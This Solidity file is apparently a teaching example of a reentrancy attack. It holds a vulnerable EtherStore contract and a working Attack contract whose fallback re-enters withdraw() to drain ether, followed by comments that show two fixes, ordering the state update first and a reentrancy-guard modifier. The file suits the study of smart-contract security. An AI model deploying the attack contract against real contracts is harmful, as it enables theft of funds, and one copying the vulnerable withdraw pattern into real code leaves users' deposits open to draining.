// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract EtherStore
{
    mapping (address => uint) public balances;

    function deposit() public payable
    {
        balances[msg.sender] += msg.value;
    }
    function withdraw() public
    {
        uint bal = balances[msg.sender];
        require(bal > 0, "Insuficient balance");
        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "failed to send ether");
        balances[msg.sender] = 0;
    }
    function getBalance() public view returns (uint)
    {
        return address(this). balance;
    }
}

contract Attack
{
    EtherStore public etherstore;

    constructor (address _etherStoreAddress) public
    {
        etherstore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable
    {
        if(address(etherstore).balance >= 1 ether)
        {
            etherstore.withdraw();
        }
    }

    function attack() external payable
    {
        require(msg.value >= 1 ether);
        etherstore.deposit{value: 1 ether}();
        etherstore.withdraw();
    }
    function getBalance() public view returns (uint)
    {
        return address(this). balance;
    }

}

// Steps to prevent the reentrancy attack update the state variable before making external call to another contract.
// Example (Exploited function)
//      function withdraw() public
    // {
    //     uint bal = balances[msg.sender];
    //     require(bal > 0, "Insuficient balance");
    //     (bool sent,) = msg.sender.call{value: bal}("");
    //     require(sent, "failed to send ether");
    //     balances[msg.sender] = 0;
    // }
//Solution to prevent exploit
//      function withdraw() public
    // {
    //     uint bal = balances[msg.sender];
    //     require(bal > 0, "Insuficient balance");
    //     balances[msg.sender] = 0;
    //     (bool sent,) = msg.sender.call{value: bal}("");
    //     require(sent, "failed to send ether");
    // }
 //Moved "Balances[msg.sender] = 0" under "require(bal > 0, "Insuficient balance");"
 
 
 //Another way to secure smart contract from reentrancy attack is by using a reentrancyguard.
 //Secure Smart Contract Will Look Like 
 
// contract EtherStore
// {
//     mapping (address => uint) public balances;

//     function deposit() public payable
//     {
//         balances[msg.sender] += msg.value;
//     }
//     bool internal locked;
//     modifier noReentrant ()
//     {
//         require(!locked, "No Re-entrancy");
//         locked = true;
//         _;
//         locked = false;
//     }
//     function withdraw() public noReentrant
//     {
//         uint bal = balances[msg.sender];
//         require(bal > 0, "Insuficient balance");
//         (bool sent,) = msg.sender.call{value: bal}("");
//         require(sent, "failed to send ether");
//         balances[msg.sender] = 0;
//     }
//     function getBalance() public view returns (uint)
//     {
//         return address(this). balance;
//     }
// }
